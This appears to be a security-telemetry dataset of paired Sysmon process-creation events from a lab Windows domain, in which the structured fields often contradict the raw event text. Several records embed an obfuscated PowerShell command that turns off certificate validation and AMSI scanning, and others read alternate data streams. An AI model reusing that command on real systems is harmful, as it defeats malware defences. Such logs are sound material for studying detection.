"{'domain': 'client', 'name': 'breach'}","{'domain': 'CLIENT2', 'name': 'setup'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT', 'ephemeral_id': '66b561db-e9d4-4076-b78e-c4ce9eada53c', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT'}","{'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2'}"
"{'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT', 'hostname': 'CLIENT'}","{'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'name': 'CLIENT2', 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}"
2021-02-04T20:36:00.292Z,2021-02-04T22:35:34.644Z
"{'user': 'breach', 'hash': ['b3dd214f23037e3d3c27d6c9447b40b5', '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1']}","{'user': 'SYSTEM', 'hash': ['3ef0d8ab08385aab5802e773511a2e6a', '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6']}"
"{'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}","{'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}"
"{'parent': {'command_line': '""C:\\Windows\\system32\\rundll32.exe"" C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy', 'name': 'rundll32.exe', 'args': ['C:\\Windows\\system32\\rundll32.exe', 'C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat', '-', 'Copy'], 'entity_id': '{19FC45AC-5AAE-601C-0000-001031ED1000}', 'pid': 2976, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}, 'name': 'wordpad.exe', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c ""Get-Content -Stream \'\' d:\\foo.bar""', 'pid': 4080, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\ProgramData\\winlogbeat\\logs\\', 'args': ['C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy'], 'hash': {'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}, 'entity_id': '{19FC45AC-5AB0-601C-0000-001007011100}'}","{'entity_id': '{19FC45AC-76B6-601C-0000-0010B6150500}', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -c ""Get-Con""""tent C:\\BREACH\\userbehavior.log -Stream \'\'""', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'powershell.exe', 'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'pid': 1856, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010BB570000}', 'pid': 348, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe']}, 'args': ['""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""', '-c', '""Get-Con""""tent C:\\BREACH\\userbehavior.log -Stream \'\'""']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 20:36:00.292
ProcessGuid: {19FC45AC-5AB0-601C-0000-001007011100}
ProcessId: 4080
Image: C:\Program Files\Windows NT\Accessories\wordpad.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Wordpad Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WORDPAD.EXE
CommandLine: ""C:\Program Files\Windows NT\Accessories\WORDPAD.EXE"" ""C:\ProgramData\winlogbeat\logs\winlogbeat - Copy""
CurrentDirectory: C:\ProgramData\winlogbeat\logs\
User: client\breach
LogonGuid: {19FC45AC-53AD-601C-0000-002012560200}
LogonId: 0x25612
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B3DD214F23037E3D3C27D6C9447B40B5,SHA256=86374883CD75B4C29C3FBA50C8580843D06753D09F3A959F26EC8E13E69835A1
ParentProcessGuid: {19FC45AC-5AAE-601C-0000-001031ED1000}
ParentProcessId: 2976
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\winlogbeat\logs\winlogbeat - Copy","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:35:34.644
ProcessGuid: {19FC45AC-76B6-601C-0000-0010B6150500}
ProcessId: 1856
Image: C:\Windows\System32\LogonUI.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Logon User Interface Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: logonui.exe
CommandLine: ""LogonUI.exe"" /flags:0x1
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-752E-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6
ParentProcessGuid: {19FC45AC-752D-601C-0000-0010BB570000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe"
"{'process': {'pid': 1524, 'thread': {'id': 1780}}, 'record_id': 1143, 'version': 5, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'computer_name': 'CLIENT', 'opcode': 'Info', 'event_data': {'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'OriginalFileName': 'WORDPAD.EXE', 'IntegrityLevel': 'High', 'Description': 'Windows Wordpad Application', 'LogonId': '0x25612', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'record_id': 1321, 'computer_name': 'CLIENT2.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'event_id': 1, 'api': 'wineventlog', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'event_data': {'OriginalFileName': 'logonui.exe', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}', 'LogonId': '0x3e7', 'Product': 'Microsoft® Windows® Operating System', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'System', 'Description': 'Windows Logon User Interface Host', 'TerminalSessionId': '0'}, 'process': {'thread': {'id': 1796}, 'pid': 1528}}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:36:01.790Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon'}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:35:35.888Z', 'kind': 'event', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"{'domain': 'client', 'name': 'breach'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT', 'ephemeral_id': '66b561db-e9d4-4076-b78e-c4ce9eada53c', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2'}"
"{'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT', 'hostname': 'CLIENT'}","{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT2.breach.local', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows'}}"
2021-02-04T22:28:14.578Z,2021-02-05T03:12:45.640Z
"{'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.052Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T03:12:46.580Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1}"
"{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'name': 'CLIENT3', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'name': 'CLIENT3.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:14.578
ProcessGuid: {19FC45AC-74FE-601C-0000-00106B4B0200}
ProcessId: 1128
Image: C:\Windows\System32\userinit.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Userinit Logon Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: USERINIT.EXE
CommandLine: C:\Windows\system32\userinit.exe
CurrentDirectory: C:\Windows\system32\
User: CLIENT3\setup
LogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}
LogonId: 0x238fd
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B
ParentProcessGuid: {19FC45AC-74F6-601C-0000-0010945C0000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe","Process Create:
RuleName: 
UtcTime: 2021-02-05 03:12:45.640
ProcessGuid: {19FC45AC-B7AD-601C-0000-00108CFF2800}
ProcessId: 2828
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': 'setup', 'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b']}","{'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'], 'user': 'LOCAL SERVICE'}"
"{'computer_name': 'CLIENT3', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'version': 5, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'task': 'Process Create (rule: ProcessCreate)', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1230, 'opcode': 'Info', 'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'LogonGuid': '{19FC45AC-74FE-601C-0000-0020FD380200}', 'TerminalSessionId': '1', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Userinit Logon Application', 'OriginalFileName': 'USERINIT.EXE', 'IntegrityLevel': 'High', 'Company': 'Microsoft Corporation', 'LogonId': '0x238fd'}}","{'event_id': 1, 'api': 'wineventlog', 'computer_name': 'CLIENT3.breach.local', 'version': 5, 'task': 'Process Create (rule: ProcessCreate)', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1592, 'opcode': 'Info', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'Description': 'Host Process for Windows Tasks', 'TerminalSessionId': '0', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e5', 'IntegrityLevel': 'System', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'OriginalFileName': 'taskhost.exe', 'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}'}}"
"{'domain': 'CLIENT3', 'name': 'setup'}","{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}"
"{'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}","{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}"
"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}"
"{'entity_id': '{19FC45AC-74FE-601C-0000-00106B4B0200}', 'pid': 1128, 'executable': 'C:\\Windows\\System32\\userinit.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'userinit.exe', 'args': ['C:\\Windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'command_line': 'powershell.exe  -exec bypass -noni -nop -w 1 -C "" & ( $SHellid[1]+$sHelLId[13]+\'X\')("" $( SV  \'OFs\'  \'\' ) ""+ [sTrING][CHaR[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( sET-iTEm \'VaRiable:Ofs\'  \' \')"" )""', 'parent': {'entity_id': '{19FC45AC-74F6-601C-0000-0010945C0000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}}","{'parent': {'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}'}, 'entity_id': '{19FC45AC-B7AD-601C-0000-00108CFF2800}', 'command_line': 'powershell  -exec bypass -noni -nop -w 1 -C "" & ( $SHellid[1]+$sHelLId[13]+\'X\')("" $( SV  \'OFs\'  \'\' ) ""+ [sTrING][CHaR[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( sET-iTEm \'VaRiable:Ofs\'  \' \')"" )""', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'pid': 2828, 'executable': 'C:\\Windows\\System32\\taskhost.exe'}"
2021-02-04T22:28:14.578Z,2021-02-04T22:28:19.828Z
"{'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.052Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.054Z', 'module': 'sysmon'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:14.578
ProcessGuid: {19FC45AC-74FE-601C-0000-00106B4B0200}
ProcessId: 1128
Image: C:\Windows\System32\userinit.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Userinit Logon Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: USERINIT.EXE
CommandLine: C:\Windows\system32\userinit.exe
CurrentDirectory: C:\Windows\system32\
User: CLIENT3\setup
LogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}
LogonId: 0x238fd
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B
ParentProcessGuid: {19FC45AC-74F6-601C-0000-0010945C0000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:19.828
ProcessGuid: {19FC45AC-7503-601C-0000-0010EC040300}
ProcessId: 2504
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-74F7-601C-0000-0010FE630000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': 'setup', 'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b']}","{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}"
